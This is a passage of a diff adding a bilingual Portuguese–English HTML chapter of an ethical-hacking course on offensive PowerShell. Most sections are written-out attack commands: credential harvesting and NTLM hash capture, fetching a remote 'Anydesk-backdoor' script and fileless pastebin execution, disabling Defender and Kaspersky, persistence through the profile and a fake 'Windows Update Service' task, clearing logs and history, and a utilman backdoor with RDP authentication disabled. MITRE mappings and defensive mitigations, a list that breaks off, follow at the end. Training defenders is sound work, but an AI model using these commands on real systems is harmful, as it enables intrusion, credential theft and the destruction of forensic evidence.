@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cap. 1 — PowerShell: The Basics | Ch. 1 — The Basics</title>
+<style>
+  :root{
+    --bg:#0d1117; --bg2:#161b22; --bg3:#1c2128; --fg:#c9d1d9; --fg2:#8b949e;
+    --accent:#39d353; --accent2:#58a6ff; --warn:#d29922; --danger:#f85149;
+    --border:#30363d; --code-bg:#0b0f14; --code-fg:#7ee787;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    line-height:1.65; font-size:16px;
+  }
+  header{
+    background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);
+    border-bottom:2px solid var(--accent);
+    padding:2rem 1.5rem 1.5rem;
+  }
+  header h1{margin:0 0 .3rem; font-size:1.9rem; color:var(--accent)}
+  header .sub{color:var(--fg2); font-size:.95rem}
+  header .meta{margin-top:.8rem; font-size:.85rem; color:var(--fg2)}
+  header .meta span{margin-right:1.2rem}
+  nav.toc{
+    background:var(--bg2); border:1px solid var(--border); border-radius:8px;
+    padding:1rem 1.2rem; margin:1.5rem auto; max-width:1100px;
+  }
+  nav.toc h2{margin:0 0 .6rem; font-size:1rem; color:var(--accent2); text-transform:uppercase; letter-spacing:.05em}
+  nav.toc ol{margin:0; padding-left:1.3rem; columns:2; column-gap:2rem}
+  nav.toc a{color:var(--fg); text-decoration:none}
+  nav.toc a:hover{color:var(--accent)}
+  main{max-width:1100px; margin:0 auto; padding:0 1.5rem 3rem}
+  section{
+    background:var(--bg2); border:1px solid var(--border); border-radius:8px;
+    padding:1.4rem 1.6rem; margin:1.5rem 0;
+  }
+  section h2{
+    margin-top:0; color:var(--accent2); font-size:1.3rem;
+    border-bottom:1px solid var(--border); padding-bottom:.5rem;
+  }
+  section h3{color:var(--accent); font-size:1.05rem; margin-top:1.4rem}
+  .lang{display:block; margin:.4rem 0}
+  .lang .pt::before{content:"🇵🇹 PT "; color:var(--accent); font-weight:600; font-size:.8rem; letter-spacing:.05em}
+  .lang .en::before{content:"🇬🇧 EN "; color:var(--accent2); font-weight:600; font-size:.8rem; letter-spacing:.05em}
+  .lang .pt,.lang .en{display:block; margin:.25rem 0 .25rem 0}
+  pre{
+    background:var(--code-bg); border:1px solid var(--border); border-left:3px solid var(--accent);
+    border-radius:6px; padding:1rem 1.1rem; overflow-x:auto;
+    font-family:"Cascadia Code","Fira Code",Consolas,monospace; font-size:.9rem;
+    color:var(--code-fg); line-height:1.5;
+  }
+  code.inline{
+    background:var(--bg3); border:1px solid var(--border); border-radius:4px;
+    padding:.1rem .4rem; font-family:Consolas,monospace; font-size:.88rem; color:var(--accent);
+  }
+  table{width:100%; border-collapse:collapse; margin:1rem 0; font-size:.92rem}
+  th,td{border:1px solid var(--border); padding:.55rem .7rem; text-align:left; vertical-align:top}
+  th{background:var(--bg3); color:var(--accent2)}
+  tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+  .callout{
+    border-left:4px solid var(--warn); background:rgba(210,153,34,.08);
+    padding:.8rem 1rem; border-radius:0 6px 6px 0; margin:1rem 0;
+  }
+  .callout.danger{border-left-color:var(--danger); background:rgba(248,81,73,.08)}
+  .callout.info{border-left-color:var(--accent2); background:rgba(88,166,255,.08)}
+  .callout.complement{border-left-color:var(--accent); background:rgba(57,211,83,.06)}
+  .callout strong{color:var(--fg)}
+  .badge{
+    display:inline-block; font-size:.7rem; font-weight:700; letter-spacing:.05em;
+    padding:.15rem .5rem; border-radius:999px; margin-left:.4rem; vertical-align:middle;
+  }
+  .badge.orig{background:rgba(88,166,255,.15); color:var(--accent2); border:1px solid var(--accent2)}
+  .badge.comp{background:rgba(57,211,83,.12); color:var(--accent); border:1px solid var(--accent)}
+  .badge.part{background:rgba(210,153,34,.15); color:var(--warn); border:1px solid var(--warn)}
+  ul.checklist{list-style:none; padding-left:0}
+  ul.checklist li::before{content:"☐ "; color:var(--accent); font-weight:700; margin-right:.3rem}
+  footer{
+    border-top:1px solid var(--border); margin-top:3rem; padding:1.5rem;
+    text-align:center; color:var(--fg2); font-size:.85rem;
+  }
+  footer a{color:var(--accent2); text-decoration:none}
+  footer a:hover{color:var(--accent)}
+  @media (max-width:720px){ nav.toc ol{columns:1} header h1{font-size:1.4rem} }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Cap. 1 — PowerShell: The Basics</h1>
+  <div class="sub">Ch. 1 — PowerShell: The Basics</div>
+  <div class="meta">
+    <span>📖 Manual de Formação Ethical Hacker</span>
+    <span>🎯 Nível: Iniciante / Beginner</span>
+  </div>
+</header>
+
+<nav class="toc">
+  <h2>Índice / Table of Contents</h2>
+  <ol>
+    <li><a href="#obj">Objetivos / Objectives</a></li>
+    <li><a href="#ctx">Contexto / Context</a></li>
+    <li><a href="#core">Comandos Core / Core Commands</a></li>
+    <li><a href="#cred">Credential Harvesting</a></li>
+    <li><a href="#exec">Execution Policy</a></li>
+    <li><a href="#dl">Download &amp; Execução / Execution</a></li>
+    <li><a href="#downgrade">Downgrade Attacks</a></li>
+    <li><a href="#av">Antivírus / Antivirus</a></li>
+    <li><a href="#b64">Base64 Encoding</a></li>
+    <li><a href="#rev">Reverse Shells</a></li>
+    <li><a href="#persist">Persistência / Persistence</a></li>
+    <li><a href="#stealth">Stealth Execution</a></li>
+    <li><a href="#hist">Command History</a></li>
+    <li><a href="#proc">Process Command Lines</a></li>
+    <li><a href="#tasks">Scheduled Tasks</a></li>
+    <li><a href="#sessions">Sessions</a></li>
+    <li><a href="#logs">Logs</a></li>
+    <li><a href="#backdoor">Backdoor (Utilman)</a></li>
+    <li><a href="#mitre">MITRE ATT&amp;CK</a></li>
+    <li><a href="#mitig">Mitigações / Mitigations</a></li>
+    <li><a href="#lab">Laboratório / Lab</a></li>
+    <li><a href="#revq">Revisão / Review</a></li>
+    <li><a href="#sum">Resumo / Summary</a></li>
+  </ol>
+</nav>
+
+<main>
+
+<!-- ===================== OBJETIVOS ===================== -->
+<section id="obj">
+  <h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+  <div class="lang">
+    <span class="pt">Dominar os comandos core do PowerShell; executar credential harvesting nativo (findstr, registo, Inveigh); contornar a execution policy; descarregar e executar ficheiros (incl. fileless); realizar downgrade attacks; detetar e desativar AV; codificar em Base64; estabelecer reverse shells; persistência via profile e scheduled tasks; execução furtiva; gestão de histórico; listagem de processos; gestão de sessões; limpeza de logs; backdoor via utilman.</span>
+    <span class="en">Master core PowerShell commands; perform native credential harvesting (findstr, registry, Inveigh); bypass execution policy; download and execute files (incl. fileless); perform downgrade attacks; detect and disable AV; Base64-encode; establish reverse shells; profile and scheduled-task persistence; stealth execution; history management; process listing; session management; log clearing; utilman backdoor.</span>
+  </div>
+</section>
+
+<!-- ===================== CONTEXTO ===================== -->
+<section id="ctx">
+  <h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+  <div class="lang">
+    <span class="pt">O PowerShell foi desenhado para administração e automação, com acesso direto ao .NET e ao WMI. Isso dá controlo sobre componentes do sistema, processos e configurações de rede. Inclui ferramentas <em>living off the land</em> (LOL) que permitem operar sem binários externos que disparem alertas — executar comandos, abrir sessões remotas, encontrar credenciais, verificar configuração, manipular o sistema e correr payloads em memória. O PowerShell ajuda a <strong>fundir-se na rotina normal do sistema</strong>.</span>
+    <span class="en">PowerShell was designed for administration and automation, with direct access to .NET and WMI. That gives control over system components, processes, and network configurations. It includes <em>living off the land</em> (LOL) tools that let you operate without external binaries that trigger alerts — execute commands, open remote sessions, find credentials, check configuration, manipulate the system, and run payloads in memory. PowerShell helps you <strong>blend into the normal system routine</strong>.</span>
+  </div>
+  <div class="callout info">
+    <strong>Nota do formador / Trainer's note:</strong>
+    <div class="lang">
+      <span class="pt">O artigo assume alvos Windows antigos (ATMs, dispositivos médicos, POS) ainda em uso por restrições orçamentais. Defensores devem também compreender como o Windows pode ser usado em ataques — não é exclusivo de Linux.</span>
+      <span class="en">The article assumes older Windows targets (ATMs, medical devices, POS) still in use due to budget constraints. Defenders must also understand how Windows can be used for attacks — it's not Linux-only.</span>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== CORE COMMANDS ===================== -->
+<section id="core">
+  <h2>3. Comandos Core / Core Commands <span class="badge orig">Original</span> <span class="badge comp">Complementar / Complementary</span></h2>
+  <div class="lang">
+    <span class="pt">O artigo apresenta uma tabela de comandos comuns para facilitar a transição de Linux. Essa tabela não foi transcrita no conteúdo disponível; a tabela abaixo foi <strong>completada pela nossa autoria</strong> com os comandos essenciais.</span>
+    <span class="en">The article presents a table of common commands to ease the Linux transition. That table was not transcribed in the available content; the table below was <strong>completed by our authorship</strong> with essential commands.</span>
+  </div>
+  <table>
+    <tr><th>Linux / cmd.exe</th><th>PowerShell</th><th>Função / Function</th></tr>
+    <tr><td><code class="inline">ls</code> / <code class="inline">dir</code></td><td><code class="inline">Get-ChildItem</code></td><td>Listar / List</td></tr>
+    <tr><td><code class="inline">cat</code> / <code class="inline">type</code></td><td><code class="inline">Get-Content</code></td><td>Ler / Read</td></tr>
+    <tr><td><code class="inline">cd</code></td><td><code class="inline">Set-Location</code></td><td>Mudar diretório / Change dir</td></tr>
+    <tr><td><code class="inline">pwd</code></td><td><code class="inline">Get-Location</code></td><td>Diretório atual / Current dir</td></tr>
+    <tr><td><code class="inline">cp</code> / <code class="inline">copy</code></td><td><code class="inline">Copy-Item</code></td><td>Copiar / Copy</td></tr>
+    <tr><td><code class="inline">mv</code> / <code class="inline">move</code></td><td><code class="inline">Move-Item</code></td><td>Mover / Move</td></tr>
+    <tr><td><code class="inline">rm</code> / <code class="inline">del</code></td><td><code class="inline">Remove-Item</code></td><td>Apagar / Delete</td></tr>
+    <tr><td><code class="inline">ps</code> / <code class="inline">tasklist</code></td><td><code class="inline">Get-Process</code></td><td>Processos / Processes</td></tr>
+    <tr><td><code class="inline">kill</code> / <code class="inline">taskkill</code></td><td><code class="inline">Stop-Process</code></td><td>Matar processo / Kill process</td></tr>
+    <tr><td><code class="inline">grep</code> / <code class="inline">findstr</code></td><td><code class="inline">Select-String</code></td><td>Procurar texto / Search text</td></tr>
+    <tr><td><code class="inline">echo</code></td><td><code class="inline">Write-Output</code></td><td>Escrever / Write</td></tr>
+    <tr><td><code class="inline">man</code> / <code class="inline">help</code></td><td><code class="inline">Get-Help</code></td><td>Ajuda / Help</td></tr>
+  </table>
+  <div class="lang">
+    <span class="pt">Comandos CMD legacy também são suportados. Por exemplo, <code class="inline">type</code> imprime o conteúdo de um ficheiro de texto:</span>
+    <span class="en">Legacy CMD commands are also supported. For example, <code class="inline">type</code> prints a text file's contents:</span>
+  </div>
+<pre>type example.txt</pre>
+  <div class="lang">
+    <span class="pt">Podes mudar de diretório com <code class="inline">cd</code>, mas em sistemas não-ingleses os nomes podem estar noutra língua e o Evil-WinRM corrompe os caracteres. Nesse caso, usa variáveis:</span>
+    <span class="en">You can change directories with <code class="inline">cd</code>, but on non-English systems names may be in another language and Evil-WinRM corrupts the characters. In that case, use variables:</span>
+  </div>
+<pre>$items = Get-ChildItem
+cd $items[4].FullName</pre>
+  <div class="lang">
+    <span class="pt">PowerShell usa indexação <strong>base zero</strong> (<code class="inline">$items[0]</code> é o primeiro item). Wildcards poupam tempo:</span>
+    <span class="en">PowerShell uses <strong>zero-based</strong> indexing (<code class="inline">$items[0]</code> is the first item). Wildcards save time:</span>
+  </div>
+<pre>cat *.txt      # todos os .txt / all .txt files
+cd *           # entra no único subdiretório / enters the only subdir
+cat 1*         # lê ficheiros começados por "1" / reads files starting with "1"
+tree /F        # estrutura recursiva / recursive structure</pre>
+</section>
+
+<!-- ===================== CREDENTIAL HARVESTING ===================== -->
+<section id="cred">
+  <h2>4. Credential Harvesting <span class="badge orig">Original</span></h2>
+
+  <h3>4.1 Findstr <span class="badge orig">Original</span></h3>
+<pre>findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.gif *.ps1 *.yml</pre>
+  <div class="lang">
+    <span class="pt">Procura recursivamente (<code class="inline">/S</code>), sem distinguir maiúsculas (<code class="inline">/I</code>), a string "password" numa lista de extensões, listando apenas os ficheiros com correspondência (<code class="inline">/M</code>). Presente em todos os Windows.</span>
+    <span class="en">Recursively (<code class="inline">/S</code>), case-insensitively (<code class="inline">/I</code>) searches for "password" across listed extensions, listing only matching files (<code class="inline">/M</code>). Built into every Windows.</span>
+  </div>
+
+  <h3>4.2 Registo / Registry <span class="badge orig">Original</span></h3>
+<pre>reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"</pre>
+  <div class="lang">
+    <span class="pt">As duas primeiras pesquisam recursivamente valores de string contendo "password" em HKLM e HKCU. A 3.ª extrai a password reversível do WinVNC v3. A 4.ª verifica autologin (pode conter <code class="inline">DefaultUsername</code>/<code class="inline">DefaultPassword</code> em texto claro). A 5.ª verifica community strings SNMP. A 6.ª lê sessões PuTTY guardadas (IPs, usernames).</span>
+    <span class="en">First two recursively search string values containing "password" in HKLM and HKCU. 3rd extracts reversible WinVNC v3 password. 4th checks autologon (may hold plaintext <code class="inline">DefaultUsername</code>/<code class="inline">DefaultPassword</code>). 5th checks SNMP community strings. 6th reads saved PuTTY sessions (IPs, usernames).</span>
+  </div>
+
+  <h3>4.3 LaZagne <span class="badge orig">Original</span></h3>
+  <div class="lang">
+    <span class="pt">Não é uma ferramenta PowerShell, mas é usada para extrair credenciais de browsers, clientes de email, WiFi, FTP e bases de dados, analisando ficheiros de configuração, registo e memória.</span>
+    <span class="en">Not a PowerShell tool, but used to extract credentials from browsers, email clients, WiFi, FTP, and databases by analyzing config files, registry, and memory.</span>
+  </div>
+
+  <h3>4.4 SMB Hash Leak (Inveigh) <span class="badge orig">Original</span></h3>
+<pre>powershell -ep bypass
+. .\Inveigh.ps1
+Invoke-Inveigh -ConsoleOutput Y -NBNS Y -HTTPS Y -PROXY Y</pre>
+  <div class="lang">
+    <span class="pt">Cria um atalho <code class="inline">.lnk</code> falso apontando para um recurso remoto inexistente. Quando o utilizador abre a pasta, o Windows tenta SMB e envia o hash NTLMv1/v2 para o servidor do atacante. Os hashes podem ser crackeados offline (Hashcat modo 5600) ou relayed. O sucesso depende de timing e configuração da interface de rede.</span>
+    <span class="en">Creates a fake <code class="inline">.lnk</code> shortcut pointing to a nonexistent remote resource. When the user opens the folder, Windows attempts SMB and sends the NTLMv1/v2 hash to the attacker's server. Hashes can be cracked offline (Hashcat mode 5600) or relayed. Success depends on timing and NIC configuration.</span>
+  </div>
+</section>
+
+<!-- ===================== EXECUTION POLICY ===================== -->
+<section id="exec">
+  <h2>5. Execution Policy <span class="badge orig">Original</span></h2>
+<pre>powershell -ep bypass
+Set-ExecutionPolicy Bypass -Scope LocalMachine -Force</pre>
+  <div class="lang">
+    <span class="pt">A execution policy controla se e como scripts PowerShell correm. <code class="inline">-ep bypass</code> contorna apenas na sessão atual. <code class="inline">Set-ExecutionPolicy</code> altera persistentemente para toda a máquina (requer admin), exceto se o Group Policy sobrepuser.</span>
+    <span class="en">Execution policy controls whether and how PowerShell scripts run. <code class="inline">-ep bypass</code> bypasses for the current session only. <code class="inline">Set-ExecutionPolicy</code> changes it persistently machine-wide (admin required), unless overridden by Group Policy.</span>
+  </div>
+</section>
+
+<!-- ===================== DOWNLOAD & EXEC ===================== -->
+<section id="dl">
+  <h2>6. Download e Execução / Download &amp; Execution <span class="badge orig">Original</span></h2>
+
+  <h3>6.1 Invoke-WebRequest / iwr</h3>
+<pre>powershell -c iwr -Uri https://raw.githubusercontent.com/AiGptCode/ANYDESK-BACKDOOR/refs/heads/main/Anydesk-backdoor.ps1 -OutFile anydesk.ps1
+iwr https://raw.githubusercontent.com/AiGptCode/ANYDESK-BACKDOOR/refs/heads/main/Anydesk-backdoor.ps1 -OutFile anydesk.ps1</pre>
+
+  <h3>6.2 Wget</h3>
+<pre>wget https://raw.githubusercontent.com/AiGptCode/ANYDESK-BACKDOOR/refs/heads/main/Anydesk-backdoor.ps1 -O anydesk.ps1</pre>
+
+  <h3>6.3 Fileless Execution</h3>
+<pre>iex (Invoke-WebRequest -Uri 'http://pastebin.com/raw/YOUFILE')</pre>
+  <div class="lang">
+    <span class="pt">Descarrega o script e canaliza-o diretamente para o interpretador via <code class="inline">Invoke-Expression</code>, executando em memória sem tocar no disco. Técnica fileless clássica.</span>
+    <span class="en">Downloads the script and pipes it directly into the interpreter via <code class="inline">Invoke-Expression</code>, executing in memory without touching disk. Classic fileless technique.</span>
+  </div>
+</section>
+
+<!-- ===================== DOWNGRADE ===================== -->
+<section id="downgrade">
+  <h2>7. Downgrade Attacks <span class="badge orig">Original</span></h2>
+<pre>powershell -version 2</pre>
+  <div class="lang">
+    <span class="pt">Lançar deliberadamente o PowerShell 2.0 para contornar proteções modernas (AMSI, logging avançado).</span>
+    <span class="en">Deliberately launch PowerShell 2.0 to bypass modern protections (AMSI, advanced logging).</span>
+  </div>
+</section>
+
+<!-- ===================== AV ===================== -->
+<section id="av">
+  <h2>8. Antivírus / Antivirus <span class="badge orig">Original</span></h2>
+<pre>Get-Service -Name windefend
+Get-Service | Where-Object { $_.DisplayName -like "*Kaspersky*" }
+Get-WmiObject -Namespace 'root\SecurityCenter2' -Class AntiVirusProduct -ComputerName 'OM-2' -Credential (Get-Credential Administrator) | Select-Object PSComputerName, displayName, pathToSignedProductExe, productState
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableNetworkProtection AuditMode -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -EnableControlledFolderAccess Disabled
+Stop-Service -Name KAVFS,kavfsslp,klnagent -Force</pre>
+  <div class="lang">
+    <span class="pt">As três primeiras verificam se o Defender ou Kaspersky estão ativos (local e remoto via WMI). <code class="inline">Set-MpPreference</code> desativa as proteções core do Defender. <code class="inline">Stop-Service</code> força a paragem dos serviços Kaspersky (instalação local).</span>
+    <span class="en">First three check if Defender or Kaspersky are running (local and remote via WMI). <code class="inline">Set-MpPreference</code> disables Defender's core protections. <code class="inline">Stop-Service</code> force-stops Kaspersky services (local install).</span>
+  </div>
+</section>
+
+<!-- ===================== B64 ===================== -->
+<section id="b64">
+  <h2>9. Base64 Encoding <span class="badge orig">Original</span></h2>
+<pre>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Write-Host "Hackers-Arise!"'))
+powershell -e "<base64>"</pre>
+  <div class="lang">
+    <span class="pt">Converte a string em Base64 (UTF-16LE, formato esperado por <code class="inline">-e</code>/<code class="inline">-EncodedCommand</code>), dificultando a leitura imediata. <code class="inline">powershell -e</code> executa o comando codificado.</span>
+    <span class="en">Converts the string to Base64 (UTF-16LE, format expected by <code class="inline">-e</code>/<code class="inline">-EncodedCommand</code>), obfuscating it. <code class="inline">powershell -e</code> executes the encoded command.</span>
+  </div>
+</section>
+
+<!-- ===================== REVERSE SHELLS ===================== -->
+<section id="rev">
+  <h2>10. Reverse Shells <span class="badge orig">Original</span></h2>
+  <div class="lang">
+    <span class="pt">Reverse shells codificadas podem ser personalizadas em <code class="inline">revshells.com</code> e usadas para ligar de volta ao listener.</span>
+    <span class="en">Encoded reverse shells can be customized on <code class="inline">revshells.com</code> and used to connect back to the listener.</span>
+  </div>
+</section>
+
+<!-- ===================== PERSISTENCE ===================== -->
+<section id="persist">
+  <h2>11. Persistência via Profile / Profile Persistence <span class="badge orig">Original</span></h2>
+<pre>Add-Content -Path $Profile -Value "C:\Windows\Temp\script.ps1"
+Set-ExecutionPolicy Bypass -Scope LocalMachine -Force</pre>
+  <div class="lang">
+    <span class="pt">Anexa uma chamada ao script malicioso ao perfil PowerShell (<code class="inline">$Profile</code>), executado automaticamente em cada nova sessão. A segunda linha garante que a execution policy não bloqueia.</span>
+    <span class="en">Appends a call to the malicious script to the PowerShell profile (<code class="inline">$Profile</code>), run automatically on every new session. The second line ensures execution policy won't block it.</span>
+  </div>
+</section>
+
+<!-- ===================== STEALTH ===================== -->
+<section id="stealth">
+  <h2>12. Execução Furtiva / Stealth Execution <span class="badge orig">Original</span></h2>
+<pre>Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\script.ps1"
+powershell.exe -NoProfile -Command "Write-Output 'Hackers-Arise!'"</pre>
+  <div class="lang">
+    <span class="pt"><code class="inline">-WindowStyle Hidden</code> evita janela visível (sem flash para a vítima). <code class="inline">-NoProfile</code> evita carregar perfis, reduzindo rastos.</span>
+    <span class="en"><code class="inline">-WindowStyle Hidden</code> prevents a visible window (no flash alerting the victim). <code class="inline">-NoProfile</code> skips profile loading, reducing traces.</span>
+  </div>
+</section>
+
+<!-- ===================== HISTORY ===================== -->
+<section id="hist">
+  <h2>13. Gestão do Histórico / Command History <span class="badge orig">Original</span></h2>
+<pre>Get-History
+Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value ""</pre>
+  <div class="lang">
+    <span class="pt">Lista o histórico da sessão, lê o ficheiro persistente do PSReadLine e <strong>sobrescreve-o com vazio</strong> (em vez de apagar o ficheiro, que pode levantar suspeitas). Por omissão guarda as últimas 50 entradas.</span>
+    <span class="en">Lists session history, reads the persistent PSReadLine file, and <strong>overwrites it with empty</strong> (rather than deleting it, which could raise suspicion). Holds the last 50 entries by default.</span>
+  </div>
+</section>
+
+<!-- ===================== PROCESS ===================== -->
+<section id="proc">
+  <h2>14. Listagem de Linhas de Comando / Process Command Lines <span class="badge orig">Original</span></h2>
+<pre>gwmi win32_process | select CommandLine</pre>
+  <div class="lang">
+    <span class="pt">Lista a linha de comando de cada processo — pode revelar usernames, passwords e IPs passados como argumentos.</span>
+    <span class="en">Lists each process's command line — may reveal usernames, passwords, and IPs passed as arguments.</span>
+  </div>
+</section>
+
+<!-- ===================== TASKS ===================== -->
+<section id="tasks">
+  <h2>15. Scheduled Tasks <span class="badge orig">Original</span></h2>
+<pre>schtasks /query /fo LIST /v > schtask.txt
+schtasks /create /tn "Windows Update Service" /tr "C:\Windows\Temp\hackers-arise.exe" /sc hourly /mo 3 /ru System
+schtasks /query /tn "Windows Update Service"
+schtasks /run /tn "Windows Update Service"
+schtasks /delete /tn "Windows Update Service" /f</pre>
+  <div class="lang">
+    <span class="pt">Exporta todas as tarefas para procurar tarefas a correr como <code class="inline">SYSTEM</code> (escalada). Cria uma tarefa com nome legítimo que corre o payload a cada 3 horas como SYSTEM (persistência). Consulta, força execução e remove.</span>
+    <span class="en">Exports all tasks to hunt for tasks running as <code class="inline">SYSTEM</code> (escalation). Creates a legitimately-named task running the payload every 3 hours as SYSTEM (persistence). Queries, forces run, and deletes.</span>
+  </div>
+</section>
+
+<!-- ===================== SESSIONS ===================== -->
+<section id="sessions">
+  <h2>16. Sessions <span class="badge orig">Original</span></h2>
+<pre>quser
+qwinsta
+logoff ((quser | Where-Object { $_ -match 'username' } ) -split '\s+' )[2]
+cmd.exe /c "rd /s /q C:\Users\username"</pre>
+  <div class="lang">
+    <span class="pt"><code class="inline">quser</code>/<code class="inline">qwinsta</code> mostram sessões ativas (utilizador, idle time). A 3.ª linha filtra o utilizador, faz split por espaços e usa o ID da sessão (índice 2) para <code class="inline">logoff</code>. A última remove a pasta de perfil criada acidentalmente (após terminar a sessão).</span>
+    <span class="en"><code class="inline">quser</code>/<code class="inline">qwinsta</code> show active sessions (user, idle time). 3rd line filters the user, splits by whitespace, and uses the session ID (index 2) for <code class="inline">logoff</code>. Last removes an accidentally created profile folder (after killing the session).</span>
+  </div>
+</section>
+
+<!-- ===================== LOGS ===================== -->
+<section id="logs">
+  <h2>17. Limpeza de Logs / Log Clearing <span class="badge orig">Original</span></h2>
+<pre>Clear-EventLog Security,System,Application; "Windows PowerShell","Microsoft-Windows-PowerShell/Operational","Microsoft-Windows-WMI-Activity/Operational" | ForEach-Object { & "$env:windir\System32\wevtutil.exe" cl $_ }</pre>
+  <div class="lang">
+    <span class="pt">Primeiro limpa os logs clássicos (Security, System, Application) com <code class="inline">Clear-EventLog</code>; depois usa <code class="inline">wevtutil.exe cl</code> para limpar os logs modernos do PowerShell e WMI — apagando rastos.</span>
+    <span class="en">First clears classic logs (Security, System, Application) with <code class="inline">Clear-EventLog</code>; then uses <code class="inline">wevtutil.exe cl</code> to clear modern PowerShell and WMI logs — covering tracks.</span>
+  </div>
+</section>
+
+<!-- ===================== BACKDOOR ===================== -->
+<section id="backdoor">
+  <h2>18. Backdoor via Utilman <span class="badge orig">Original</span></h2>
+<pre>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f</pre>
+  <div class="lang">
+    <span class="pt">A chave IFEO faz com que <code class="inline">utilman.exe</code> (botão "Acesso Fácil" no login) seja substituído por <code class="inline">cmd.exe</code>. Ao premir Win+U no login, abre-se um CMD com privilégios <strong>SYSTEM</strong>. A segunda chave desativa o NLA no RDP, permitindo sessão RDP sem credenciais válidas. Requer reboot (ou usar Sticky Keys para evitar reboot).</span>
+    <span class="en">The IFEO key makes <code class="inline">utilman.exe</code> (the "Ease of Access" button at login) launch <code class="inline">cmd.exe</code>. Pressing Win+U at login opens a CMD with <strong>SYSTEM</strong> privileges. The second key disables NLA on RDP, allowing an RDP session without valid credentials. Requires reboot (or use Sticky Keys to avoid rebooting).</span>
+  </div>
+</section>
+
+<!-- ===================== MITRE ===================== -->
+<section id="mitre">
+  <h2>19. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar / Complementary</span></h2>
+  <table>
+    <tr><th>Técnica / Technique</th><th>ID</th><th>Onde aparece / Where it appears</th></tr>
+    <tr><td>Command and Scripting Interpreter: PowerShell</td><td>T1059.001</td><td>Todo o capítulo / Whole chapter</td></tr>
+    <tr><td>Credentials in Files</td><td>T1552.001</td><td>findstr, LaZagne</td></tr>
+    <tr><td>Credentials in Registry</td><td>T1552.002</td><td><code class="inline">reg query</code></td></tr>
+    <tr><td>Forced Authentication</td><td>T1187</td><td>SMB Hash Leak</td></tr>
+    <tr><td>Ingress Tool Transfer</td><td>T1105</td><td><code class="inline">iwr</code>, <code class="inline">wget</code>, <code class="inline">iex</code></td></tr>
+    <tr><td>Obfuscated Files or Information</td><td>T1027</td><td>Base64, fileless</td></tr>
+    <tr><td>Impair Defenses: Disable or Modify Tools</td><td>T1562.001</td><td><code class="inline">Set-MpPreference</code></td></tr>
+    <tr><td>Event Triggered Execution: PowerShell Profile</td><td>T1546.013</td><td><code class="inline">$Profile</code></td></tr>
+    <tr><td>Hide Artifacts: Hidden Window</td><td>T1564.003</td><td><code class="inline">-WindowStyle Hidden</code></td></tr>
+    <tr><td>Indicator Removal: Clear Command History</td><td>T1070.003</td><td><code class="inline">Set-Content ... -Value ""</code></td></tr>
+    <tr><td>Process Discovery</td><td>T1057</td><td><code class="inline">gwmi win32_process</code></td></tr>
+    <tr><td>Scheduled Task/Job</td><td>T1053.005</td><td><code class="inline">schtasks</code></td></tr>
+    <tr><td>Indicator Removal: Clear Windows Event Logs</td><td>T1070.001</td><td><code class="inline">Clear-EventLog</code>, <code class="inline">wevtutil</code></td></tr>
+    <tr><td>Event Triggered Execution: Accessibility Features</td><td>T1546.008</td><td>Utilman backdoor</td></tr>
+  </table>
+</section>
+
+<!-- ===================== MITIGAÇÕES ===================== -->
+<section id="mitig">
+  <h2>20. Mitigações Blue Team / Blue Team Mitigations <span class="badge comp">Complementar / Complementary</span></h2>
+  <ol>
+    <li><strong>Script Block Logging (4104)</strong> + <strong>Module Logging (4103)</strong> — apanham <code class="inline">iex</code>, Base64, fileless. / catch <code class="inline">iex</code>, Base64, fileless.</li>
+    <li><strong>AMSI</strong> ativo — deteta <code class="inline">iex (iwr ...)</code> em tempo real. / detects <code class="inline">iex (iwr ...)</code> in real time.</li>
+    <li><strong>Constrained Language Mode</strong> — bloqueia <code class="inline">New-Object</code>, <code class="inline">Add-Type</code>. / blocks them.</li>
+    <li><strong>AppLocker/WDAC</strong> — restringe <code class="inline">.ps1</code> a caminhos assinados; bloqueia <code class="inline">powershell -ep bypass</code>. / restricts <code class="inline">.ps1</code> to signed paths; blocks <code class="inline">-ep bypass</code>.</li>
+    <li><strong>Desativar PowerShell 2.0</strong> — evita downgrade. / prevents downgrade.
+<pre>Disable-WindowsOptionalFeature -FeatureName MicrosoftWindowsPowerShellV2 -Online</pre></li>
+    <li><strong>Proteger IFEO</strong> — ACLs restritas em <code class="inline">HKLM\...\Image File Execution Options</code>; monitorizar criação de chaves <code class="inline">Debugger</code>. / restrict ACLs; monitor <code class="inline">Debugger</code> key creation.</li>
+    <li><strong>Exigir NLA no RDP</strong> — GPO: <em>Require user authentication for remote connections by using Network Level Authentication</em>. / enforce NLA via GPO.</li>
